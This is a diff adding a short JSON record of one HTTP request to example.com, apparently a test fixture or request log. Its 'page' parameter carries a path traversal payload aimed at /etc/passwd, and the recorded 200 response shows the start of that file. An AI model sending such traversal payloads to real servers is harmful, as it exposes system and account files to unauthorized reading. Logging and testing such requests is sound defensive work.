@@ -1,0 +1,19 @@
+{
+  "url": "https://example.com/view",
+  "method": "GET",
+  "headers": {
+    "User-Agent": "Mozilla/5.0",
+    "Accept": "text/html"
+  },
+  "params": {
+    "page": "../../../../etc/passwd"
+  },
+  "body": "",
+  "payload": "../../../../etc/passwd",
+  "response_status": 200,
+  "response_headers": {
+    "Content-Type": "text/html"
+  },
+  "response_body": "root:x:0:0:root:/root:/bin/bash\n...",
+  "timestamp": "2025-05-25T16:30:00Z"
+}
